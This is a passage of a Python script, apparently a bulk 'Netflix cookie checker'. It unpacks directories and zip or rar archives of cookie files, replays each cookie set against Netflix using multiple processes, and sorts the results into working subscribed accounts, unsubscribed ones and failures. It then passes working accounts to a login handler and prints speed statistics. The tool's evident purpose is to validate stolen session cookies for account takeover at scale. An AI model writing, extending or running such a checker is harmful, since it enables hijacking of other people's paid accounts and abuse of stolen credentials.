    # Ensure thread count is within limits
    num_threads = max(1, min(num_threads, MAX_THREADS))
    
    start_time = time.time()
    debug_print(f"Starting Netflix cookie check with {num_processes} processes and up to {num_threads} threads per process")
    
    # Setup directories
    setup_directories()
    
    # Convert any JSON cookies to Netscape format
    process_json_files(cookies_dir)
    
    # Process the directory recursively to find all cookie files including in archives
    cookie_files = process_directory(cookies_dir)
    
    debug_print(f"Found {len(cookie_files)} Netflix cookie files to check")
    
    if not cookie_files:
        debug_print("No cookie files found.")
        return []
    
    # Initialize multiprocessing resources
    manager = Manager()
    shared_results = manager.list()
    
    # Divide files into batches for multiprocessing
    batch_size = max(1, len(cookie_files) // num_processes)
    batches = [cookie_files[i:i + batch_size] for i in range(0, len(cookie_files), batch_size)]
    
    debug_print(f"Divided {len(cookie_files)} files into {len(batches)} batches of approximately {batch_size} each")
    
    # Display initial information 
    print(f"\n[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] Starting cookie check with {num_processes} processes")
    print(f"Total cookies to check: {len(cookie_files)} | Batch size: {batch_size}")
    
    try:
        # Use ThreadPoolExecutor for faster processing
        with concurrent.futures.ProcessPoolExecutor(max_workers=num_processes) as executor:
            # Submit all batches for processing
            futures = [executor.submit(process_batch, batch, i) for i, batch in enumerate(batches)]
            
            # Process results as they complete
            for future in concurrent.futures.as_completed(futures):
                try:
                    batch_result = future.result()
                    if batch_result:
                        # Update global counters atomically
                        with lock:
                            total_working += batch_result["working"]
                            total_fails += batch_result["fails"]
                            total_unsubscribed += batch_result["unsubscribed"]
                            total_checked += batch_result["checked"]
                            total_broken += batch_result["broken"]
                            
                            # Add batch results to shared results
                            shared_results.extend(batch_result["results"])
                            
                            # Calculate and display overall progress
                            elapsed_time = time.time() - start_time
                            overall_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
                            batch_speed = batch_result["checked"] / batch_result["time"] if batch_result["time"] > 0 else 0
                            
                            print(f"\n[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] 🚀 BATCH {batch_result['batch_id']} COMPLETED 🚀")
                            print(f"  ✅ Processed: {batch_result['checked']} cookies in {batch_result['time']:.2f} seconds")
                            print(f"  ⚡ Batch speed: {batch_speed:.2f} cookies/sec")
                            print(f"  📊 Overall progress: {total_checked}/{len(cookie_files)} cookies")
                            print(f"  ✓ Valid: {total_working} | ❌ Failed: {total_fails} | ⚠️ Broken: {total_broken}")
                            print(f"  🚀 Overall speed: {overall_speed:.2f} cookies/sec | ⏱️ Elapsed: {elapsed_time:.2f}s")
                except Exception as e:
                    debug_print(f"Error processing batch: {str(e)}")
    except Exception as e:
        debug_print(f"Error in process pool: {str(e)}")
    
    # Convert shared_results to a normal list
    results = list(shared_results)
    
    elapsed_time = time.time() - start_time
    debug_print(f"Cookie checking completed in {elapsed_time:.2f} seconds")
    
    # Calculate and print final statistics
    checking_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
    print(f"\n🎬 NETFLIX COOKIE CHECK RESULTS 🎬")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"✅ Total checked: {total_checked} cookies")
    print(f"✓ Working cookies: {total_working}")
    print(f"⚠️ Unsubscribed accounts: {total_unsubscribed}")
    print(f"❌ Failed cookies: {total_fails}")
    print(f"🔧 Broken files: {total_broken}")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"⏱️ Total processing time: {elapsed_time:.2f} seconds")
    print(f"🚀 Average checking speed: {checking_speed:.2f} cookies/sec")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    return results

def print_statistics():
    """Print statistics of the Netflix cookie checking process."""
    elapsed_time = time.time() - start_time
    checking_speed = total_checked / elapsed_time if elapsed_time > 0 else 0
    
    print(f"\n🎬 NETFLIX COOKIE CHECK RESULTS 🎬")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"✅ Total checked: {total_checked} cookies")
    print(f"✓ Working cookies: {total_working}")
    print(f"⚠️ Unsubscribed accounts: {total_unsubscribed}")
    print(f"❌ Failed cookies: {total_fails}")
    print(f"🔧 Broken files: {total_broken}")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"⏱️ Total processing time: {elapsed_time:.2f} seconds")
    print(f"🚀 Average checking speed: {checking_speed:.2f} cookies/sec")
    print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    # Also log to debug
    debug_print("\n--- Netflix Cookie Check Statistics ---")
    debug_print(f"Total checked: {total_checked}")
    debug_print(f"Working cookies: {total_working}")
    debug_print(f"Unsubscribed accounts: {total_unsubscribed}")
    debug_print(f"Failed cookies: {total_fails}")
    debug_print(f"Broken cookies: {total_broken}")
    debug_print(f"Processing time: {elapsed_time:.2f} seconds")
    debug_print(f"Checking speed: {checking_speed:.2f} cookies/sec")
    debug_print("-------------------------------------\n")

def check_cookie(cookie_content):
    """Check a single Netflix cookie string."""
    # Create a temporary file for the cookie
    temp_dir = os.path.join("temp", "netflix")
    os.makedirs(temp_dir, exist_ok=True)
    
    temp_file = os.path.join(temp_dir, f"temp_cookie_{int(time.time())}.txt")
    
    try:
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(cookie_content)
        
        result = process_cookie_file(temp_file)
        return result
    except Exception as e:
        debug_print(f"Error checking single cookie: {str(e)}")
        if os.path.exists(temp_file):
            os.remove(temp_file)
        return {"valid": False, "details": None, "file": "temp_cookie.txt"}

# Main function to run when script is executed directly
if __name__ == "__main__":
    colorama.init()
    print_banner()
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Check Netflix cookies')
    parser.add_argument('input_file', nargs='?', help='File or directory to check')
    parser.add_argument('--all_cookies', action='store_true', help='Check all cookies in netflix directory')
    parser.add_argument('--threads', type=int, default=MAX_THREADS, help=f'Number of threads to use (1-{MAX_THREADS}, default: {MAX_THREADS})')
    args = parser.parse_args()
    
    # Validate and set thread count
    if args.threads < 1:
        args.threads = 1
    elif args.threads > MAX_THREADS:
        args.threads = MAX_THREADS
    
    debug_print(f"Using {args.threads} threads for processing")
    
    # Setup directories
    setup_directories()
    
    if args.all_cookies:
        # Check all cookies in the netflix directory
        debug_print("Checking all Netflix cookies...")
        print("Checking all Netflix cookies in the netflix directory...")
        
        if os.path.exists(NETFLIX_DIR):
            check_netflix_cookies(NETFLIX_DIR)
        else:
            error_msg = f"Error: Netflix directory not found at {NETFLIX_DIR}"
            print(error_msg)
            debug_print(error_msg)
            sys.exit(1)
    elif args.input_file:
        filepath = args.input_file
        if os.path.isfile(filepath):
            # If checking a single file
            debug_print(f"Checking single cookie file: {filepath}")
            
            # Check file extension to see if it's an archive
            file_ext = os.path.splitext(filepath)[1].lower()
            if file_ext in ['.zip', '.rar']:
                # For archives, extract and process all files
                extract_dir = os.path.join(os.path.dirname(filepath), f"temp_extracted_{os.path.basename(filepath)}")
                os.makedirs(extract_dir, exist_ok=True)
                
                global total_working, total_fails, total_unsubscribed, total_checked, total_broken
                
                if extract_from_archive(filepath, extract_dir):
                    # Process all extracted cookie files
                    cookie_files = process_directory(extract_dir)
                    
                    if cookie_files:
                        debug_print(f"Processing {len(cookie_files)} cookie files from archive")
                        print(f"Processing {len(cookie_files)} cookie files from archive")
                        
                        # Process each cookie file
                        results = []
                        valid_count = 0
                        invalid_count = 0
                        
                        for cookie_file in cookie_files:
                            try:
                                # Load cookies and check if valid
                                cookies = load_cookies_from_file(cookie_file)
                                
                                if not cookies:
                                    total_broken += 1
                                    continue
                                    
                                # Make request with cookies
                                response_text = make_request_with_cookies(cookies)
                                
                                if not response_text:
                                    total_fails += 1
                                    total_checked += 1
                                    continue
                                    
                                # Extract info from response
                                try:
                                    info = extract_info(response_text)
                                    is_subscribed = info.get('membershipStatus') == "CURRENT_MEMBER"
                                    
                                    if is_subscribed:
                                        total_working += 1
                                        # Handle the working cookie
                                        handle_successful_login(cookie_file, info, is_subscribed)
                                    else:
                                        total_unsubscribed += 1
                                        
                                    total_checked += 1
                                    
                                except Exception as e:
                                    debug_print(f"Error extracting info from cookie file {cookie_file}: {e}")
                                    total_fails += 1
                                    total_checked += 1
                                
                            except Exception as e:
                                debug_print(f"Error processing cookie file {cookie_file}: {e}")
                                total_broken += 1
                        
                        # Print statistics
                        print_statistics()
                    else:
                        debug_print("No cookie files found in the archive")
                        print_statistics()
                else:
                    # If extraction failed, try processing the archive as a regular file
                    result = process_cookie_file(filepath)
                    print_statistics()
            else:
                # For regular files, just process the single file
                result = process_cookie_file(filepath)
                print_statistics()
        else:
            # If it's a directory, check all files in it
            check_netflix_cookies(filepath)
    else:
        # Default behavior with no arguments - check netflix directory
        check_netflix_cookies()